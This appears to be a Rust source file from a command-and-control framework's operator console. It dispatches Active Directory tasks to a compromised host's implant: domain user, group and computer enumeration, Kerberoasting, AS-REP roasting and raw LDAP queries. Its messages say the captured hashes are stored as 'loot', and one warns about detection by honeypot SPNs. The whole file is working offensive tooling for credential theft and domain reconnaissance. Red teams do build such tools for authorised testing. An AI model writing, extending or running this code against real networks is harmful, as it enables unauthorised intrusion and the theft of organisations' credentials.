//! Active Directory enumeration commands

use anyhow::Result;
use common::ImplantId;
use prost::Message;

use crate::cli::CliState;
use crate::display::{print_info, print_success};

/// Enumerate domain users
pub async fn users(cli: &CliState, filter: Option<&str>) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info("Enumerating domain users...");
    if let Some(f) = filter {
        print_info(&format!("Filter: {}", f));
    }

    let task = protocol::AdTask {
        operation: Some(protocol::ad_task::Operation::Users(protocol::AdGetUsers {
            filter: filter.map(|f| f.to_string()),
            privileged_only: None,
        })),
    };
    let task_data = task.encode_to_vec();

    let task_id = cli.client.dispatch_task(implant_id, "ad", task_data).await?;
    print_success(&format!("Task dispatched: {}", hex::encode(task_id.as_bytes())));

    Ok(())
}

/// Enumerate domain groups
pub async fn groups(cli: &CliState, filter: Option<&str>) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info("Enumerating domain groups...");
    if let Some(f) = filter {
        print_info(&format!("Filter: {}", f));
    }

    let task = protocol::AdTask {
        operation: Some(protocol::ad_task::Operation::Groups(protocol::AdGetGroups {
            filter: filter.map(|f| f.to_string()),
        })),
    };
    let task_data = task.encode_to_vec();

    let task_id = cli.client.dispatch_task(implant_id, "ad", task_data).await?;
    print_success(&format!("Task dispatched: {}", hex::encode(task_id.as_bytes())));

    Ok(())
}

/// Enumerate domain computers
pub async fn computers(cli: &CliState, filter: Option<&str>) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info("Enumerating domain computers...");
    if let Some(f) = filter {
        print_info(&format!("Filter: {}", f));
    }

    let task = protocol::AdTask {
        operation: Some(protocol::ad_task::Operation::Computers(protocol::AdGetComputers {
            filter: filter.map(|f| f.to_string()),
            dcs_only: None,
        })),
    };
    let task_data = task.encode_to_vec();

    let task_id = cli.client.dispatch_task(implant_id, "ad", task_data).await?;
    print_success(&format!("Task dispatched: {}", hex::encode(task_id.as_bytes())));

    Ok(())
}

/// Perform Kerberoasting attack
pub async fn kerberoast(cli: &CliState) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info("Kerberoasting... hashes will be stored in loot");
    print_info("OPSEC WARNING: Kerberoasting requests TGS tickets for SPN accounts - may be detected by honeypot SPNs");

    let task = protocol::AdTask {
        operation: Some(protocol::ad_task::Operation::Kerberoast(protocol::AdKerberoast {
            format: None,
        })),
    };
    let task_data = task.encode_to_vec();
    let task_id = cli.client.dispatch_task(implant_id, "ad", task_data).await?;
    print_success(&format!("Task dispatched: {}", hex::encode(task_id.as_bytes())));

    Ok(())
}

/// Perform AS-REP roasting attack
pub async fn asreproast(cli: &CliState) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info("Performing AS-REP roasting... hashes will be stored in loot");
    print_info("Targeting accounts with Kerberos pre-authentication disabled");

    let task = protocol::AdTask {
        operation: Some(protocol::ad_task::Operation::Asreproast(protocol::AdAsreproast {
            format: None,
        })),
    };
    let task_data = task.encode_to_vec();
    let task_id = cli.client.dispatch_task(implant_id, "ad", task_data).await?;
    print_success(&format!("Task dispatched: {}", hex::encode(task_id.as_bytes())));

    Ok(())
}

/// Run raw LDAP query
pub async fn query(cli: &CliState, ldap_filter: &str, attributes: &[String]) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info(&format!("Running LDAP query: {}", ldap_filter));

    let task = protocol::AdTask {
        operation: Some(protocol::ad_task::Operation::Query(protocol::AdQuery {
            ldap_filter: ldap_filter.to_string(),
            attributes: attributes.to_vec(),
            search_base: None,
        })),
    };
    let task_data = task.encode_to_vec();

    let task_id = cli.client.dispatch_task(implant_id, "ad", task_data).await?;
    print_success(&format!("Task dispatched: {}", hex::encode(task_id.as_bytes())));

    Ok(())
}
